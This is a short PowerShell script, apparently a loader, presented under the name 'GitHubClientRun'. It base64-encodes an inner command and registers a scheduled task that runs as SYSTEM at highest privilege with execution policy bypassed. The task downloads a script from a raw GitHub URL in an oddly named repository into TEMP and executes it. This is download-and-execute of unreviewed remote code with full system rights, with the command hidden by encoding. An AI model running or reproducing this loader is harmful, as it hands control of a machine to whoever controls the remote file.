$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$runner = Join-Path $env:TEMP "manual-client-run.ps1"
$out = Join-Path $env:TEMP "github-client.out"
$inner = @"
`$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
`$o = "$out"
Remove-Item `$o -Force -ErrorAction SilentlyContinue
try {
    (New-Object Net.WebClient).DownloadFile("$root/manual-client-run.ps1", "$runner")
    (& powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$runner") *>&1 |
        Out-File -FilePath `$o -Encoding utf8
    Add-Content -Path `$o -Value "GITHUB_CLIENT_DONE"
} catch {
    Add-Content -Path `$o -Value ("GITHUB_CLIENT_ERROR=" + `$_.Exception.Message)
}
"@
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes($inner)
)
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
$principal = New-ScheduledTaskPrincipal -UserId SYSTEM `
    -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable `
    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "GitHubClientRun" -Action $action `
    -Trigger $trigger -Principal $principal -Settings $settings -Force |
    Out-Null
Start-ScheduledTask -TaskName "GitHubClientRun"
Write-Output "GITHUB_CLIENT_TASK_STARTED"
